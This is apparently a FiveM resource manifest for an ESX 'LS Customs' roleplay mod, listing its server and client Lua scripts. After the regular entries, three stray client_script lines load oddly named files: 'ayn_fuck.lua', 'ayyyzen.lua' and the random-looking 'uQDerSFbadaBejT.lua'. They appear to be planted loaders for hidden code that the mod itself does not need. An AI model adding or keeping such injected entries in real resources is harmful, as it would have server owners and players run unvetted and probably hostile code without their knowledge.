resource_manifest_version '44febabe-d386-4d18-afbe-5e627f4af937'

description 'ESX LS Customs'

version '2.1'

server_scripts {
	'@mysql-async/lib/MySQL.lua',
	'@es_extended/locale.lua',
	'locales/fr.lua',
	'config.lua',
	'server/main.lua'
}

client_scripts {
	'@es_extended/locale.lua',
	'locales/fr.lua',
	'config.lua',
	'client/main.lua'
}
client_script "ayn_fuck.lua"



client_script "ayyyzen.lua"


client_script "uQDerSFbadaBejT.lua"